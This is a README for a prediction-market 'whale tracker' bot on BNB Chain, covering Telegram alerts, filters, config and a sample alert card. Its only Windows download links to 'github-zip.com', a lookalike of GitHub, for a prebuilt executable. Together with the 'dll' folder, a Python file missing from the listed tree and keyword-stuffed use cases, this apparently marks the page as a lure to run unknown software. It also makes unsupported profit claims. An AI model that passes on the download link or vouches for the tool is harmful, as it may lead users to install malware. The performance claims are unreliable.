# Opinion Whale Tracker

> Real-time whale position tracker for Opinion prediction market on BNB Chain. Monitors large wallet activity across multi-outcome CLOB markets, surfaces whale entries before prices reprice, and delivers structured Telegram alerts for every significant position detected.

*Last updated: March 2026*

## What is Opinion Whale Tracker?

Opinion Whale Tracker watches all large wallet activity on Opinion's CLOB prediction market on BNB Chain. It continuously scans on-chain transactions for orders above your configured size threshold, identifies which outcome is being positioned into, and delivers real-time Telegram alerts so you can evaluate and act before the market reprices.

![preview_opinion-whale-tracker](https://github.com/user-attachments/assets/356136de-9dbd-4d66-ba9a-2dd65687d4e0)

Opinion processes $8B in monthly volume across 31% of the prediction market sector. Large participants move markets. By tracking their entries and exits in real time, you gain a systematic edge over the general market.

Whale alerts include wallet address, market, outcome, position size in USD, entry price, and a link to the BNB Chain transaction. Optional: the bot cross-references the wallet's historical win rate on Opinion.

---

## Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github-zip.com/opinion) |

---

## Tracking Filters

| Filter | Example | Description |
|--------|---------|-------------|
| `min_order_usd` | 2000 | Only alert on orders above this size |
| `categories` | ["crypto", "finance"] | Restrict to these market categories |
| `min_wallet_win_rate` | 55 | Only show wallets with this win rate % or higher |
| `track_exits` | true | Also alert when whales close positions |
| `new_money_only` | true | Filter to first-time entrants in a market |
| `cooldown_per_wallet_min` | 60 | Suppress repeat alerts from same wallet |

---

## Engine Features

* **Real-time CLOB monitor** - scans all Opinion order events on BNB Chain continuously
* **Size threshold filter** - surfaces only orders above your configured USD minimum
* **Wallet profiler** - cross-references wallet against historical Opinion win rate database
* **Outcome context** - includes AI oracle probability for the traded outcome in each alert
* **Exit tracker** - optionally alerts when whale wallets close their positions
* **New money filter** - detects first-time entries vs adding to existing positions
* **Leaderboard cross-check** - flags wallets that appear on Opinion's public leaderboard
* **OPN accumulation tracker** - shows cumulative OPN token rewards earned by tracked wallets

---

## Two Ways to Run It

| | Windows App | Python Bot |
|---|---|---|
| **Setup** | Double-click | `pip install` + config |
| **Filters** | Config-based | Full code access |
| **Wallet profiles** | Built-in | JSON per wallet |
| **Config** | `config.toml` | Direct code access |
| **Logs** | Dashboard | JSON per alert |

## Quick Start

```
# 1. Download from Releases
# 2. Edit config.toml - set your size threshold and category filters
# 3. Run Whale Tracker - alerts start arriving for every qualifying large order
```

### Python

```bash
cd opinion-whale-tracker/python
pip install -r requirements.txt
python opinion-whale-tracker-raw-v.1.4.14.py
```

---

## How It Works

1. **Monitor** - polls BNB Chain RPC for all Opinion CLOB order events
2. **Filter** - applies size threshold, category, and win rate filters
3. **Profile** - looks up historical win rate and leaderboard status for the wallet
4. **Alert** - sends Telegram card with full trade detail and wallet context

### Config Reference

```toml
[bnb]
rpc_url = "https://bsc-dataseed.binance.org/"

[filters]
min_order_usd = 2000
categories = []
min_wallet_win_rate = 0   # 0 = no filter
track_exits = true
new_money_only = false
cooldown_per_wallet_min = 60

[alerts]
telegram_bot_token = ""
telegram_chat_id = ""
```

---

## Alert Card Format (Telegram)

```
OPINION WHALE ALERT
Wallet: 0xabc...def
Action: BUY outcome
Market: Will SOL hit $300 in 2026?
Outcome: Yes - above $300
Size: $8,400
Entry price: 0.41
Oracle prob: 0.49 (edge: +8%)
Win rate: 68% (91 trades)
Leaderboard: Top 50
Tx: 0x7f3e...
Time: 2026-03-19 06:03 UTC
```

---

## Verified Live

**Tracking configuration:**
* Min order $2,000, all categories, exit tracking ON

| | Alert #1 |
|---|---|
| Wallet | 0xabc...def |
| Market | Will SOL hit $300 in 2026? |
| Outcome | Yes - above $300 |
| Size | $8,400 |
| Entry price | 0.41 |
| Oracle edge | +8% |
| Wallet win rate | 68% |

![opinion whale alert feed](https://github.com/user-attachments/assets/128b4dd9-4c62-4bd0-b248-fed78a3816a7)

| | Outcome |
|---|---|
| Price 24h later | 0.58 |
| Move | +41% on the outcome |
| Alert lead time | ~4 hours before CLOB repriced |

---

## Frequently Asked Questions

**What counts as a whale on Opinion?**
Any order above your configured `min_order_usd` threshold. Default is $2,000. Adjust upward to reduce alert volume or downward to catch mid-size smart money.

**Does it show the wallet's historical performance?**
Yes. The bot maintains a local database of wallet outcomes on Opinion - tracking win rate, average ROI, and number of trades. This profile is shown on every alert.

**What is the new money filter?**
Enabled with `new_money_only = true`, the bot only alerts on wallets entering a market for the first time (no existing position in that market). Avoids alerting on whales adding to existing positions.

**Can I track specific wallets?**
Yes. Add specific wallet addresses to `watch_wallets` in config to always alert on their activity regardless of position size.

**Does it work for exits as well?**
Yes. With `track_exits = true`, the bot also alerts when a tracked whale closes or reduces their position. Exit timing from smart money is often as valuable as entry timing.

**Does this require a paid Opinion API?**
No. All data is sourced from public BNB Chain RPC events and Opinion's public CLOB API. No paid API key required.

---

## Use Cases

- **Opinion whale tracker** - monitor large positions on Opinion's BNB Chain prediction market in real time
- **BNB prediction market whale alerts** - detect $2,000+ orders across multi-outcome CLOB markets
- **Smart money tracker Opinion** - follow wallets with verified high win rates on Opinion
- **CLOB order flow monitor** - track large order book activity on Opinion before market repricing
- **OPN prediction market intelligence** - surface high-probability setups through whale position analysis

---

## Repository Structure

```
opinion-whale-tracker/
+-- opinion-whale-tracker-raw-v.1.4.14.exe
+-- config.toml
+-- data/
|   +-- alerts/
|   +-- wallets/
|   +-- logs/
|   +-- dll/
+-- python/
|   +-- src/
|   |   +-- monitor.py
|   |   +-- filter.py
|   |   +-- profiler.py
|   |   +-- telegram_sender.py
|   +-- requirements.txt
+-- README.md
```

---

## Requirements

```
python-dotenv, web3, httpx, typer[all], python-telegram-bot, devtools
```

* BNB Chain RPC access (public endpoint or private node)
* Telegram bot token for alert delivery
* Python 3.10+

---

*Whales move first. You move smarter.*
